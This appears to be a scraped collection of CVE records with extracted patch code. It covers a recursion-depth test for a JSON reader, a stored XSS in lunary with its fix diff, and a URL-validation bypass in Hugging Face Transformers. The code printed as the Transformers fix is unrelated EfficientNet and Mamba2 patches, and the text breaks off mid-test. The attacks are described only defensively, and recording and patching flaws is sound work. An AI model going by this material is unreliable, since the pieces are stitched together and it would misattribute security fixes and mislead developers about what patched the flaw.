+def test_max_recursion_attack(tmp_path):
+    original_limit = sys.getrecursionlimit()
+    try:
+        nested_dict = {}
+        current_level = nested_dict
+        sys.setrecursionlimit(5000)
+
+        for i in range(1, 2001):  # Create 2000 levels of nesting
+            if i == 2000:
+                current_level[f"level{i}"] = "final_value"
+            else:
+                current_level[f"level{i}"] = {}
+                current_level = current_level[f"level{i}"]
+
+        file_name = tmp_path / "test_nested.json"
+        with open(file_name, "w") as f:
+            f.write(json.dumps(nested_dict))
+
+        # Force a recursion error
+        sys.setrecursionlimit(500)
+        reader = JSONReader(levels_back=1)
+        with pytest.warns(UserWarning):
+            data = reader.load_data(file_name)
+            assert data == []
+
+    finally:
+        sys.setrecursionlimit(original_limit)


================================================================================


CVE ID: CVE-2025-4779
Published: 2025-07-07T10:15:28.717
Modified: 2025-07-08T16:18:34.923
CVSS Score: 9.1 (CRITICAL) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
lunary-ai/lunary versions prior to 1.9.24 are vulnerable to stored cross-site scripting (XSS). An unauthenticated attacker can inject malicious JavaScript into the `v1/runs/ingest` endpoint by adding an empty `citations` field, triggering a code path where `dangerouslySetInnerHTML` is used to render attacker-controlled text. This vulnerability allows the execution of arbitrary JavaScript in the context of the user's browser, potentially leading to session hijacking, data theft, or other malicious actions.

References (2):
  1. https://github.com/lunary-ai/lunary/commit/18750294a76ff6c0f3f1b6af4ac1a23399836b16
  2. https://huntr.com/bounties/c603b64e-5171-4eed-8983-a7f656ce2c4d

Attempting to extract code examples from references...

--- Code from https://github.com/lunary-ai/lunary/commit/18750294a76ff6c0f3f1b6af4ac1a23399836b16 ---
From 18750294a76ff6c0f3f1b6af4ac1a23399836b16 Mon Sep 17 00:00:00 2001
From: Hugues Chocart <chocart.hugues@icloud.com>
Date: Mon, 19 May 2025 20:38:57 +0200
Subject: [PATCH] fix: xss vulnerability (#983)

---
 .../components/SmartViewer/Message.tsx        | 44 ++++++++++++++++---
 1 file changed, 38 insertions(+), 6 deletions(-)

diff --git a/packages/frontend/components/SmartViewer/Message.tsx b/packages/frontend/components/SmartViewer/Message.tsx
index f935a346a..2aea37b0e 100644
--- a/packages/frontend/components/SmartViewer/Message.tsx
+++ b/packages/frontend/components/SmartViewer/Message.tsx
@@ -241,16 +241,48 @@ function TextMessage({
       </Code>
     );
   } else if (data.citations) {
-    const textWithLinks = text.replace(/\[(\d+)\]/g, (match, numberStr) => {
-      const idx = parseInt(numberStr, 10) - 1;
+    const displayedText = compact ? text?.substring(0, 150) : text;
+    const elements: React.ReactNode[] = [];
+    const regex = /\[(\d+)\]/g;
+    let lastIndex = 0;
+    let match;
+    while ((match = regex.exec(displayedText)) !== null) {
+      if (match.index > lastIndex) {
+        const segment = displayedText.slice(lastIndex, match.index);
+        elements.push(
+          <ProtectedText key={`text-${elements.length}`}>
+            <HighlightPii text={segment} piiDetection={piiDetection} />
+          </ProtectedText>,
+        );
+      }
+      const idx = parseInt(match[1], 10) - 1;
       if (data.citations[idx]) {
-        return `<a href="${data.citations[idx]}" target="_blank" class="${classes.citationLink}">[${numberStr}]</a>`;
+        elements.push(
+          <a
+            key={`citation-${elements.length}`}
+            href={data.citations[idx]}
+            target="_blank"
+            className={classes.citationLink}
+          >
+            [{match[1]}]
+          </a>,
+        );
+      } else {
+        elements.push(match[0]);
       }
-      return match;
-    });
+      lastIndex = regex.lastIndex;
+    }
+    if (lastIndex < displayedText.length) {
+      const segment = displayedText.slice(lastIndex);
+      elements.push(
+        <ProtectedText key={`text-${elements.length}`}>
+          <HighlightPii text={segment} piiDetection={piiDetection} />
+        </ProtectedText>,
+      );
+    }
     return (
       <Code className={classes.textMessage}>
-        <Text size="sm" dangerouslySetInnerHTML={{ __html: textWithLinks }} />
+        <Text size="sm">{elements}</Text>
       </Code>
     );
   } else {


================================================================================


CVE ID: CVE-2025-3777
Published: 2025-07-07T10:15:28.297
Modified: 2025-08-07T00:54:16.957
CVSS Score: 3.5 (LOW) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-20: Improper Input Validation
  - NVD-CWE-noinfo: NVD-CWE-noinfo

Description:
Hugging Face Transformers versions up to 4.49.0 are affected by an improper input validation vulnerability in the `image_utils.py` file. The vulnerability arises from insecure URL validation using the `startswith()` method, which can be bypassed through URL username injection. This allows attackers to craft URLs that appear to be from YouTube but resolve to malicious domains, potentially leading to phishing attacks, malware distribution, or data exfiltration. The issue is fixed in version 4.52.1.

References (2):
  1. https://github.com/huggingface/transformers/commit/4dda5f71b35fb70cf602187eef84bb17a50b9082 [Patch]
  2. https://huntr.com/bounties/ccba0730-9248-4853-b7ff-5c20e6364f09 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/huggingface/transformers/commit/4dda5f71b35fb70cf602187eef84bb17a50b9082 ---
From a7d2bbaaa8aac64f7c1ee8c1421cfe84b38359a4 Mon Sep 17 00:00:00 2001
From: Zeeshan Khan Suri <5270999+zshn25@users.noreply.github.com>
Date: Wed, 16 Apr 2025 21:59:24 +0200
Subject: [PATCH 1/4] Add EfficientNet Image PreProcessor (#37055)

* added efficientnet image preprocessor but tests fail

* ruff checks pass

* ruff formatted

* properly pass rescale_offset through the functions

* - corrected indentation, ordering of methods
- reshape test passes when casted to float64
- equivalence test doesn't pass

* all tests now pass
- changes order of rescale, normalize acc to slow
- rescale_offset defaults to False acc to slow
- resample was causing difference in fast and slow. Changing test to bilinear resolves this difference

* ruff reformat

* F.InterpolationMode.NEAREST_EXACT gives TypeError: Object of type InterpolationMode is not JSON serializable

* fixes offset not being applied when do_rescale and do_normalization are both true

* - using nearest_exact sampling
- added tests for rescale + normalize

* resolving reviews

---------

Co-authored-by: Yoni Gozlan <74535834+yonigozlan@users.noreply.github.com>
---
 docs/source/en/model_doc/efficientnet.md      |   5 +
 src/transformers/image_utils.py               |   2 +-
 .../models/auto/image_processing_auto.py      |   4 +-
 .../models/efficientnet/__init__.py           |   1 +
 .../image_processing_efficientnet_fast.py     | 226 ++++++++++++++++++
 .../test_image_processing_efficientnet.py     | 106 ++++++--
 6 files changed, 322 insertions(+), 22 deletions(-)
 create mode 100644 src/transformers/models/efficientnet/image_processing_efficientnet_fast.py

diff --git a/docs/source/en/model_doc/efficientnet.md b/docs/source/en/model_doc/efficientnet.md
index a34378fa4709..17a96aeb5ad4 100644
--- a/docs/source/en/model_doc/efficientnet.md
+++ b/docs/source/en/model_doc/efficientnet.md
@@ -43,6 +43,11 @@ The original code can be found [here](https://github.com/tensorflow/tpu/tree/mas
 [[autodoc]] EfficientNetImageProcessor
     - preprocess
 
+## EfficientNetImageProcessorFast
+
+[[autodoc]] EfficientNetImageProcessorFast
+    - preprocess
+
 ## EfficientNetModel
 
 [[autodoc]] EfficientNetModel
diff --git a/src/transformers/image_utils.py b/src/transformers/image_utils.py
index 21dbbe374cc2..b9241b057f14 100644
--- a/src/transformers/image_utils.py
+++ b/src/transformers/image_utils.py
@@ -65,7 +65,7 @@
         from torchvision.transforms import InterpolationMode
 
         pil_torch_interpolation_mapping = {
-            PILImageResampling.NEAREST: InterpolationMode.NEAREST,
+            PILImageResampling.NEAREST: InterpolationMode.NEAREST_EXACT,
             PILImageResampling.BOX: InterpolationMode.BOX,
             PILImageResampling.BILINEAR: InterpolationMode.BILINEAR,
             PILImageResampling.HAMMING: InterpolationMode.HAMMING,
diff --git a/src/transformers/models/auto/image_processing_auto.py b/src/transformers/models/auto/image_processing_auto.py
index d04c6b6ee46b..082a78199642 100644
--- a/src/transformers/models/auto/image_processing_auto.py
+++ b/src/transformers/models/auto/image_processing_auto.py
@@ -56,7 +56,7 @@
 else:
     IMAGE_PROCESSOR_MAPPING_NAMES = OrderedDict(
         [
-            ("align", ("EfficientNetImageProcessor",)),
+            ("align", ("EfficientNetImageProcessor", "EfficientNetImageProcessorFast")),
             ("aria", ("AriaImageProcessor",)),
             ("beit", ("BeitImageProcessor",)),
             ("bit", ("BitImageProcessor", "BitImageProcessorFast")),
@@ -83,7 +83,7 @@
             ("donut-swin", ("DonutImageProcessor", "DonutImageProcessorFast")),
             ("dpt", ("DPTImageProcessor",)),
             ("efficientformer", ("EfficientFormerImageProcessor",)),
-            ("efficientnet", ("EfficientNetImageProcessor",)),
+            ("efficientnet", ("EfficientNetImageProcessor", "EfficientNetImageProcessorFast")),
             ("flava", ("FlavaImageProcessor", "FlavaImageProcessorFast")),
             ("focalnet", ("BitImageProcessor", "BitImageProcessorFast")),
             ("fuyu", ("FuyuImageProcessor",)),
diff --git a/src/transformers/models/efficientnet/__init__.py b/src/transformers/models/efficientnet/__init__.py
index 68a2825c7057..24d58e81167e 100644
--- a/src/transformers/models/efficientnet/__init__.py
+++ b/src/transformers/models/efficientnet/__init__.py
@@ -20,6 +20,7 @@
 if TYPE_CHECKING:
     from .configuration_efficientnet import *
     from .image_processing_efficientnet import *
+    from .image_processing_efficientnet_fast import *
     from .modeling_efficientnet import *
 else:
     import sys
diff --git a/src/transformers/models/efficientnet/image_processing_efficientnet_fast.py b/src/transformers/models/efficientnet/image_processing_efficientnet_fast.py
new file mode 100644
index 000000000000..fb639564014f
--- /dev/null
+++ b/src/transformers/models/efficientnet/image_processing_efficientnet_fast.py
@@ -0,0 +1,226 @@
+# coding=utf-8
+# Copyright 2025 The HuggingFace Inc. team. All rights reserved.
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+"""Fast Image processor class for EfficientNet."""
+
+from functools import lru_cache
+from typing import Optional, Union
+
+from ...image_processing_utils_fast import (
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING,
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING_PREPROCESS,
+    BaseImageProcessorFast,
+    BatchFeature,
+    DefaultFastImageProcessorKwargs,
+)
+from ...image_transforms import group_images_by_shape, reorder_images
+from ...image_utils import (
+    IMAGENET_STANDARD_MEAN,
+    IMAGENET_STANDARD_STD,
+    ImageInput,
+    PILImageResampling,
+    SizeDict,
+)
+from ...processing_utils import Unpack
+from ...utils import (
+    TensorType,
+    add_start_docstrings,
+    is_torch_available,
+    is_torchvision_available,
+    is_torchvision_v2_available,
+)
+
+
+if is_torch_available():
+    import torch
+
+if is_torchvision_available():
+    if is_torchvision_v2_available():
+        from torchvision.transforms.v2 import functional as F
+    else:
+        from torchvision.transforms import functional as F
+
+
+class EfficientNetFastImageProcessorKwargs(DefaultFastImageProcessorKwargs):
+    rescale_offset: bool
+    include_top: bool
+
+
+@add_start_docstrings(
+    "Constructs a fast EfficientNet image processor.",
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING,
+)
+class EfficientNetImageProcessorFast(BaseImageProcessorFast):
+    resample = PILImageResampling.NEAREST
+    image_mean = IMAGENET_STANDARD_MEAN
+    image_std = IMAGENET_STANDARD_STD
+    size = {"height": 346, "width": 346}
+    crop_size = {"height": 289, "width": 289}
+    do_resize = True
+    do_center_crop = False
+    do_rescale = True
+    rescale_factor = 1 / 255
+    rescale_offset = False
+    do_normalize = True
+    include_top = True
+    valid_kwargs = EfficientNetFastImageProcessorKwargs
+
+    def __init__(self, **kwargs: Unpack[EfficientNetFastImageProcessorKwargs]):
+        super().__init__(**kwargs)
+
+    def rescale(
+        self,
+        image: "torch.Tensor",
+        scale: float,
+        offset: Optional[bool] = True,
+        **kwargs,
+    ) -> "torch.Tensor":
+        """
+        Rescale an image by a scale factor.
+
+        If `offset` is `True`, the image has its values rescaled by `scale` and then offset by 1. If `scale` is
+        1/127.5, the image is rescaled between [-1, 1].
+            image = image * scale - 1
+
+        If `offset` is `False`, and `scale` is 1/255, the image is rescaled between [0, 1].
+            image = image * scale
+
+        Args:
+            image (`torch.Tensor`):
+                Image to rescale.
+            scale (`float`):
+                The scaling factor to rescale pixel values by.
+            offset (`bool`, *optional*):
+                Whether to scale the image in both negative and positive directions.
+
+        Returns:
+            `torch.Tensor`: The rescaled image.
+        """
+
+        rescaled_image = image * scale
+
+        if offset:
+            rescaled_image -= 1
+
+        return rescaled_image
+
+    @lru_cache(maxsize=10)
+    def _fuse_mean_std_and_rescale_factor(
+        self,
+        do_normalize: Optional[bool] = None,
+        image_mean: Optional[Union[float, list[float]]] = None,
+        image_std: Optional[Union[float, list[float]]] = None,
+        do_rescale: Optional[bool] = None,
+        rescale_factor: Optional[float] = None,
+        device: Optional["torch.device"] = None,
+        rescale_offset: Optional[bool] = False,
+    ) -> tuple:
+        if do_rescale and do_normalize and not rescale_offset:
+            # Fused rescale and normalize
+            image_mean = torch.tensor(image_mean, device=device) * (1.0 / rescale_factor)
+            image_std = torch.tensor(image_std, device=device) * (1.0 / rescale_factor)
+            do_rescale = False
+        return image_mean, image_std, do_rescale
+
+    def rescale_and_normalize(
+        self,
+        images: "torch.Tensor",
+        do_rescale: bool,
+        rescale_factor: float,
+        do_normalize: bool,
+        image_mean: Union[float, list[float]],
+        image_std: Union[float, list[float]],
+        rescale_offset: bool = False,
+    ) -> "torch.Tensor":
+        """
+        Rescale and normalize images.
+        """
+        image_mean, image_std, do_rescale = self._fuse_mean_std_and_rescale_factor(
+            do_normalize=do_normalize,
+            image_mean=image_mean,
+            image_std=image_std,
+            do_rescale=do_rescale,
+            rescale_factor=rescale_factor,
+            device=images.device,
+            rescale_offset=rescale_offset,
+        )
+        # if/elif as we use fused rescale and normalize if both are set to True
+        if do_rescale:
+            images = self.rescale(images, rescale_factor, rescale_offset)
+        if do_normalize:
+            images = self.normalize(images.to(dtype=torch.float32), image_mean, image_std)
+
+        return images
+
+    def _preprocess(
+        self,
+        images: list["torch.Tensor"],
+        do_resize: bool,
+        size: SizeDict,
+        interpolation: Optional["F.InterpolationMode"],
+        do_center_crop: bool,
+        crop_size: SizeDict,
+        do_rescale: bool,
+        rescale_factor: float,
+        rescale_offset: bool,
+        do_normalize: bool,
+        include_top: bool,
+        image_mean: Optional[Union[float, list[float]]],
+        image_std: Optional[Union[float, list[float]]],
+        return_tensors: Optional[Union[str, TensorType]],
+        **kwargs,
+    ) -> BatchFeature:
+        # Group images by size for batched resizing
+        grouped_images, grouped_images_index = group_images_by_shape(images)
+        resized_images_grouped = {}
+        for shape, stacked_images in grouped_images.items():
+            if do_resize:
+                stacked_images = self.resize(image=stacked_images, size=size, interpolation=interpolation)
+            resized_images_grouped[shape] = stacked_images
+        resized_images = reorder_images(resized_images_grouped, grouped_images_index)
+
+        # Group images by size for further processing
+        # Needed in case do_resize is False, or resize returns images with different sizes
+        grouped_images, grouped_images_index = group_images_by_shape(resized_images)
+        processed_images_grouped = {}
+        for shape, stacked_images in grouped_images.items():
+            if do_center_crop:
+                stacked_images = self.center_crop(stacked_images, crop_size)
+            # Fused rescale and normalize
+            stacked_images = self.rescale_and_normalize(
+                stacked_images, do_rescale, rescale_factor, do_normalize, image_mean, image_std, rescale_offset
+            )
+            if include_top:
+                stacked_images = self.normalize(stacked_images, 0, image_std)
+            processed_images_grouped[shape] = stacked_images
+
+        processed_images = reorder_images(processed_images_grouped, grouped_images_index)
+        processed_images = torch.stack(processed_images, dim=0) if return_tensors else processed_images
+
+        return BatchFeature(data={"pixel_values": processed_images}, tensor_type=return_tensors)
+
+    @add_start_docstrings(
+        BASE_IMAGE_PROCESSOR_FAST_DOCSTRING_PREPROCESS,
+        """
+        rescale_offset (`bool`, *optional*, defaults to `self.rescale_offset`):
+            Whether to rescale the image between [-max_range/2, scale_range/2] instead of [0, scale_range].
+        include_top (`bool`, *optional*, defaults to `self.include_top`):
+            Normalize the image again with the standard deviation only for image classification if set to True.
+        """,
+    )
+    def preprocess(self, images: ImageInput, **kwargs: Unpack[EfficientNetFastImageProcessorKwargs]) -> BatchFeature:
+        return super().preprocess(images, **kwargs)
+
+
+__all__ = ["EfficientNetImageProcessorFast"]
diff --git a/tests/models/efficientnet/test_image_processing_efficientnet.py b/tests/models/efficientnet/test_image_processing_efficientnet.py
index 577798e9aeca..cb8fc8d92209 100644
--- a/tests/models/efficientnet/test_image_processing_efficientnet.py
+++ b/tests/models/efficientnet/test_image_processing_efficientnet.py
@@ -17,15 +17,26 @@
 
 import numpy as np
 
+from transformers.image_utils import PILImageResampling
 from transformers.testing_utils import require_torch, require_vision
-from transformers.utils import is_vision_available
+from transformers.utils import (
+    is_torch_available,
+    is_torchvision_available,
+    is_vision_available,
+)
 
 from ...test_image_processing_common import ImageProcessingTestMixin, prepare_image_inputs
 
 
+if is_torch_available():
+    import torch
+
 if is_vision_available():
     from transformers import EfficientNetImageProcessor
 
+    if is_torchvision_available():
+        from transformers import EfficientNetImageProcessorFast
+
 
 class EfficientNetImageProcessorTester:
     def __init__(
@@ -41,6 +52,10 @@ def __init__(
         do_normalize=True,
         image_mean=[0.5, 0.5, 0.5],
         image_std=[0.5, 0.5, 0.5],
+        do_rescale=True,
+        rescale_offset=True,
+        rescale_factor=1 / 127.5,
+        resample=PILImageResampling.BILINEAR,  # NEAREST is too different between PIL and torchvision
     ):
         size = size if size is not None else {"height": 18, "width": 18}
         self.parent = parent
@@ -54,6 +69,7 @@ def __init__(
         self.do_normalize = do_normalize
         self.image_mean = image_mean
         self.image_std = image_std
+        self.resample = resample
 
     def prepare_image_processor_dict(self):
         return {
@@ -62,6 +78,7 @@ def prepare_image_processor_dict(self):
             "do_normalize": self.do_normalize,
             "do_resize": self.do_resize,
             "size": self.size,
+            "resample": self.resample,
         }
 
     def expected_output_image_shape(self, images):
@@ -83,6 +100,7 @@ def prepare_image_inputs(self, equal_resolution=False, numpify=False, torchify=F
 @require_vision
 class EfficientNetImageProcessorTest(ImageProcessingTestMixin, unittest.TestCase):
     image_processing_class = EfficientNetImageProcessor if is_vision_available() else None
+    fast_image_processing_class = EfficientNetImageProcessorFast if is_torchvision_available() else None
 
     def setUp(self):
         super().setUp()
@@ -93,30 +111,80 @@ def image_processor_dict(self):
         return self.image_processor_tester.prepare_image_processor_dict()
 
     def test_image_processor_properties(self):
-        image_processing = self.image_processing_class(**self.image_processor_dict)
-        self.assertTrue(hasattr(image_processing, "image_mean"))
-        self.assertTrue(hasattr(image_processing, "image_std"))
-        self.assertTrue(hasattr(image_processing, "do_normalize"))
-        self.assertTrue(hasattr(image_processing, "do_resize"))
-        self.assertTrue(hasattr(image_processing, "size"))
+        for image_processing_class in self.image_processor_list:
+            image_processing = image_processing_class(**self.image_processor_dict)
+            self.assertTrue(hasattr(image_processing, "image_mean"))
+            self.assertTrue(hasattr(image_processing, "image_std"))
+            self.assertTrue(hasattr(image_processing, "do_normalize"))
+            self.assertTrue(hasattr(image_processing, "do_resize"))
+            self.assertTrue(hasattr(image_processing, "size"))
 
     def test_image_processor_from_dict_with_kwargs(self):
-        image_processor = self.image_processing_class.from_dict(self.image_processor_dict)
-        self.assertEqual(image_processor.size, {"height": 18, "width": 18})
+        for image_processing_class in self.image_processor_list:
+            image_processor = image_processing_class.from_dict(self.image_processor_dict)
+            self.assertEqual(image_processor.size, {"height": 18, "width": 18})
 
-        image_processor = self.image_processing_class.from_dict(self.image_processor_dict, size=42)
-        self.assertEqual(image_processor.size, {"height": 42, "width": 42})
+            image_processor = image_processing_class.from_dict(self.image_processor_dict, size=42)
+            self.assertEqual(image_processor.size, {"height": 42, "width": 42})
 
     def test_rescale(self):
         # EfficientNet optionally rescales between -1 and 1 instead of the usual 0 and 1
         image = np.arange(0, 256, 1, dtype=np.uint8).reshape(1, 8, 32)
 
-        image_processor = self.image_processing_class(**self.image_processor_dict)
-
-        rescaled_image = image_processor.rescale(image, scale=1 / 127.5)
-        expected_image = (image * (1 / 127.5)).astype(np.float32) - 1
-        self.assertTrue(np.allclose(rescaled_image, expected_image))
+        for image_processing_class in self.image_processor_list:
+            image_processor = image_processing_class(**self.image_processor_dict)
+            if image_processing_class == EfficientNetImageProcessorFast:
+                image = torch.from_numpy(image)
+
+                # Scale between [-1, 1] with rescale_factor 1/127.5 and rescale_offset=True
+                rescaled_image = image_processor.rescale(image, scale=1 / 127.5, offset=True)
+                expected_image = (image * (1 / 127.5)) - 1
+                self.assertTrue(torch.allclose(rescaled_image, expected_image))
+
+                # Scale between [0, 1] with rescale_factor 1/255 and rescale_offset=True
+                rescaled_image = image_processor.rescale(image, scale=1 / 255, offset=False)
+                expected_image = image / 255.0
+                self.assertTrue(torch.allclose(rescaled_image, expected_image))
+
+            else:
+                rescaled_image = image_processor.rescale(image, scale=1 / 127.5, dtype=np.float64)
+                expected_image = (image * (1 / 127.5)).astype(np.float64) - 1
+                self.assertTrue(np.allclose(rescaled_image, expected_image))
+
+                rescaled_image = image_processor.rescale(image, scale=1 / 255, offset=False, dtype=np.float64)
+                expected_image = (image / 255.0).astype(np.float64)
+                self.assertTrue(np.allclose(rescaled_image, expected_image))
+
+    @require_vision
+    @require_torch
+    def test_rescale_normalize(self):
+        if self.image_processing_class is None or self.fast_image_processing_class is None:
+            self.skipTest(reason="Skipping slow/fast equivalence test as one of the image processors is not defined")
+
+        image = torch.arange(0, 256, 1, dtype=torch.uint8).reshape(1, 8, 32).repeat(3, 1, 1)
+        image_mean_0 = (0.0, 0.0, 0.0)
+        image_std_0 = (1.0, 1.0, 1.0)
+        image_mean_1 = (0.5, 0.5, 0.5)
+        image_std_1 = (0.5, 0.5, 0.5)
+
+        image_processor_fast = self.fast_image_processing_class(**self.image_processor_dict)
+
+        # Rescale between [-1, 1] with rescale_factor=1/127.5 and rescale_offset=True. Then normalize
+        rescaled_normalized = image_processor_fast.rescale_and_normalize(
+            image, True, 1 / 127.5, True, image_mean_0, image_std_0, True
+        )
+        expected_image = (image * (1 / 127.5)) - 1
+        expected_image = (expected_image - torch.tensor(image_mean_0).view(3, 1, 1)) / torch.tensor(image_std_0).view(
+            3, 1, 1
+        )
+        self.assertTrue(torch.allclose(rescaled_normalized, expected_image, rtol=1e-3))
 
-        rescaled_image = image_processor.rescale(image, scale=1 / 255, offset=False)
-        expected_image = (image / 255.0).astype(np.float32)
-        self.assertTrue(np.allclose(rescaled_image, expected_image))
+        # Rescale between [0, 1] with rescale_factor=1/255 and rescale_offset=False. Then normalize
+        rescaled_normalized = image_processor_fast.rescale_and_normalize(
+            image, True, 1 / 255, True, image_mean_1, image_std_1, False
+        )
+        expected_image = image * (1 / 255.0)
+        expected_image = (expected_image - torch.tensor(image_mean_1).view(3, 1, 1)) / torch.tensor(image_std_1).view(
+            3, 1, 1
+        )
+        self.assertTrue(torch.allclose(rescaled_normalized, expected_image, rtol=1e-3))

From 4005730044dd4de1575052eec24c1860ef97ccf9 Mon Sep 17 00:00:00 2001
From: Chih-Chieh Yang <7364402+cyang49@users.noreply.github.com>
Date: Wed, 16 Apr 2025 16:16:01 -0400
Subject: [PATCH 2/4] Fix Mamba2 Grouped SSD Support in the torch_forward Path
 (#37533)

* Fix mamba2 grouped support in bamba torch path

* patch zamba2 and mamba2

* Add a unit test for grouped SSD

* add comment for the new unit test

* add output_size arg value to repeat_interleave calls

* Add comment
---
 src/transformers/models/bamba/modeling_bamba.py   | 4 ++--
 src/transformers/models/bamba/modular_bamba.py    | 4 ++--
 src/transformers/models/mamba2/modeling_mamba2.py | 4 ++--
 src/transformers/models/zamba2/modeling_zamba2.py | 4 ++--
 src/transformers/models/zamba2/modular_zamba2.py  | 4 ++--
 tests/models/mamba2/test_modeling_mamba2.py       | 8 ++++++++
 6 files changed, 18 insertions(+), 10 deletions(-)

diff --git a/src/transformers/models/bamba/modeling_bamba.py b/src/transformers/models/bamba/modeling_bamba.py
index 62496ba4ebdc..0fb696c1f736 100644
--- a/src/transformers/models/bamba/modeling_bamba.py
+++ b/src/transformers/models/bamba/modeling_bamba.py
@@ -783,8 +783,8 @@ def torch_forward(
             hidden_states = hidden_states.reshape(batch_size, seq_len, -1, self.head_dim).float()
             B = B.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
             C = C.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
-            B = B.repeat(1, 1, self.num_heads // self.n_groups, 1)
-            C = C.repeat(1, 1, self.num_heads // self.n_groups, 1)
+            B = B.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
+            C = C.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
             pad_size = (self.chunk_size - seq_len % self.chunk_size) % self.chunk_size
 
             D_residual = self.D[..., None] * pad_tensor_by_size(hidden_states, pad_size)
diff --git a/src/transformers/models/bamba/modular_bamba.py b/src/transformers/models/bamba/modular_bamba.py
index 8d64fdd989fe..3e0eb513d5cd 100644
--- a/src/transformers/models/bamba/modular_bamba.py
+++ b/src/transformers/models/bamba/modular_bamba.py
@@ -580,8 +580,8 @@ def torch_forward(
             hidden_states = hidden_states.reshape(batch_size, seq_len, -1, self.head_dim).float()
             B = B.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
             C = C.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
-            B = B.repeat(1, 1, self.num_heads // self.n_groups, 1)
-            C = C.repeat(1, 1, self.num_heads // self.n_groups, 1)
+            B = B.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
+            C = C.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
             pad_size = (self.chunk_size - seq_len % self.chunk_size) % self.chunk_size
 
             D_residual = self.D[..., None] * pad_tensor_by_size(hidden_states, pad_size)
diff --git a/src/transformers/models/mamba2/modeling_mamba2.py b/src/transformers/models/mamba2/modeling_mamba2.py
index 070af4016a4e..a1ca8d095c25 100644
--- a/src/transformers/models/mamba2/modeling_mamba2.py
+++ b/src/transformers/models/mamba2/modeling_mamba2.py
@@ -572,8 +572,8 @@ def torch_forward(self, input_states, cache_params: Optional[Mamba2Cache]=None,
             hidden_states = hidden_states.reshape(batch_size, seq_len, -1, self.head_dim).float()
             B = B.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
             C = C.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
-            B = B.repeat(1, 1, self.num_heads // self.n_groups, 1)
-            C = C.repeat(1, 1, self.num_heads // self.n_groups, 1)
+            B = B.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
+            C = C.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
             pad_size = (self.chunk_size - seq_len % self.chunk_size) % self.chunk_size
 
             D_residual = self.D[..., None] * pad_tensor_by_size(hidden_states, pad_size)
diff --git a/src/transformers/models/zamba2/modeling_zamba2.py b/src/transformers/models/zamba2/modeling_zamba2.py
index 7854b04bc63d..ad6ca0f872e4 100644
--- a/src/transformers/models/zamba2/modeling_zamba2.py
+++ b/src/transformers/models/zamba2/modeling_zamba2.py
@@ -860,8 +860,8 @@ def torch_forward(self, input_states, cache_params: Optional[Zamba2HybridDynamic
             hidden_states = hidden_states.reshape(batch_size, seq_len, -1, self.head_dim).float()
             B = B.reshape(batch_size, seq_len,  -1, self.ssm_state_size).float()
             C = C.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
-            B = B.repeat(1, 1, self.num_heads // self.n_groups, 1)
-            C = C.repeat(1, 1, self.num_heads // self.n_groups, 1)
+            B = B.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
+            C = C.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
             pad_size = (self.chunk_size - seq_len % self.chunk_size) % self.chunk_size
 
             D_residual = self.D[..., None] * pad_tensor_by_size(hidden_states, pad_size)
diff --git a/src/transformers/models/zamba2/modular_zamba2.py b/src/transformers/models/zamba2/modular_zamba2.py
index 2c672bba5ae6..cd0af82658a5 100644
--- a/src/transformers/models/zamba2/modular_zamba2.py
+++ b/src/transformers/models/zamba2/modular_zamba2.py
@@ -630,8 +630,8 @@ def torch_forward(self, input_states, cache_params: Optional[Zamba2HybridDynamic
             hidden_states = hidden_states.reshape(batch_size, seq_len, -1, self.head_dim).float()
             B = B.reshape(batch_size, seq_len,  -1, self.ssm_state_size).float()
             C = C.reshape(batch_size, seq_len, -1, self.ssm_state_size).float()
-            B = B.repeat(1, 1, self.num_heads // self.n_groups, 1)
-            C = C.repeat(1, 1, self.num_heads // self.n_groups, 1)
+            B = B.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
+            C = C.repeat_interleave(self.num_heads // self.n_groups, dim=2, output_size=self.num_heads)
             pad_size = (self.chunk_size - seq_len % self.chunk_size) % self.chunk_size
 
             D_residual = self.D[..., None] * pad_tensor_by_size(hidden_states, pad_size)
diff --git a/tests/models/mamba2/test_modeling_mamba2.py b/tests/models/mamba2/test_modeling_mamba2.py
index d55655c6ac77..31565bf23d89 100644
--- a/tests/models/mamba2/test_modeling_mamba2.py
+++ b/tests/models/mamba2/test_modeling_mamba2.py
@@ -238,6 +238,14 @@ def test_mamba2_slow_vs_fast_forward(self):
         config_and_inputs = self.model_tester.prepare_config_and_inputs()
         self.model_tester.create_and_check_mamba2_slow_vs_fast_forward(*config_and_inputs)
 
+    # This test adjusts n_groups to half the original setting and effectively
+    # creates a grouped SSD configuration in the mamba2 layers
+    # See https://github.com/huggingface/transformers/pull/37533/
+    def test_mamba2_slow_vs_fast_forward_grouped(self):
+        config_and_inputs = self.model_tester.prepare_config_and_inputs()
